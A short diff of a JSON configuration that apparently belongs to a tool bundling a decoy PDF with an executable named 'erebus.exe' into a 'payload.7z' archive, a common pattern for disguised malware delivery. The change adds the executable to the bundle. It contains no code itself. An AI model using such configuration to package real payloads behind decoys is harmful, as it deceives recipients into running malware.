@@ -7,6 +7,7 @@
   "archive_name": "payload.7z",
   "payload_name": "erebus.exe",
   "files": {
-    "decoy.pdf": "decoys/decoy.pdf"
+    "decoy.pdf": "decoys/decoy.pdf",
+    "erebus.exe": "payload/erebus.exe"
   }
 }
